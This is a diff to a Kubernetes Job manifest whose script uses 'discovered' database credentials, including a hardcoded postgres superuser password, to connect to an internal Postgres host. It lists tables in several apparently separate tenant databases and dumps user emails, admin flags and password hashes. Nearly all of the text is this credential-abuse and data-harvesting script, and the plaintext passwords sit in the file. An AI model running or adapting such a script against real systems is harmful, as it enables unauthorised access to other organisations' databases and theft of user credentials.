@@ -1,7 +1,7 @@
 apiVersion: batch/v1
 kind: Job
 metadata:
-  name: dune-db-v6
+  name: dune-db-v7
   namespace: default
 spec:
   ttlSecondsAfterFinished: 600
@@ -16,28 +16,31 @@ spec:
         args:
         - |
           apk add -q postgresql-client
-          
-          # Try connecting to dune DB with discovered credentials
           PG_HOST="172.16.10.14"
-          PG_PORT="5432"
-          PG_USER="duneuser"
           PG_PASS="psJVV0VTF66hHUcH"
           
-          echo "=LIST_DBS="
-          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p $PG_PORT -U $PG_USER -l 2>&1
-          echo "=END_DBS="
+          echo "=TACHCORP_DB="
+          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "\dt" 2>&1
+          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d tachcorp_db -c "SELECT id, email, is_superuser, is_active, hashed_password FROM users LIMIT 5;" 2>&1
+          echo "=END_TACHCORP="
           
-          # Try default DB = duneuser
-          echo "=USERS_TABLE="
-          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p $PG_PORT -U $PG_USER -d duneuser -c "\dt" 2>&1
-          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p $PG_PORT -U $PG_USER -d duneuser -c "SELECT id, email, is_superuser, is_active FROM users LIMIT 10;" 2>&1
-          echo "=END_USERS="
+          echo "=SIERRAREX_DB="
+          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "\dt" 2>&1
+          PGPASSWORD="$PG_PASS" psql -h $PG_HOST -p 5432 -U duneuser -d sierrarex_db -c "SELECT id, email, is_superuser FROM users LIMIT 5;" 2>&1
+          echo "=END_SIERRAREX="
           
-          # Also try via pgBouncer port 6432 with postgres superuser
-          PG_PORT2="6432"
-          echo "=SUPER_DATABASES="
-          PGPASSWORD="wpEJl3WKOImARD9WgBsa" psql -h $PG_HOST -p $PG_PORT2 -U postgres -l 2>&1 | grep -v "^-" | head -50
-          echo "=END_SUPER_DBS="
+          # Also try with superuser to see all dbs with users table
+          echo "=FIND_USER_TABLES="
+          for DB in tachcorp_db sierrarex_db tachyus.com_db aconcagua_db cairn_db; do
+            COUNT=$(PGPASSWORD="wpEJl3WKOImARD9WgBsa" psql -h $PG_HOST -p 6432 -U postgres -d "$DB" -tAc "SELECT COUNT(*) FROM information_schema.tables WHERE table_name='users'" 2>/dev/null)
+            echo "$DB: users_count=$COUNT"
+          done
+          echo "=END_FIND="
+          
+          # Query tachcorp_db users with superuser
+          echo "=TACHCORP_USERS_SUPER="
+          PGPASSWORD="wpEJl3WKOImARD9WgBsa" psql -h $PG_HOST -p 6432 -U postgres -d tachcorp_db -c "SELECT id, email, is_superuser, is_active, hashed_password FROM users LIMIT 10;" 2>&1
+          echo "=END_SUPER="
           
           echo "SLEEPING..."
           sleep 180
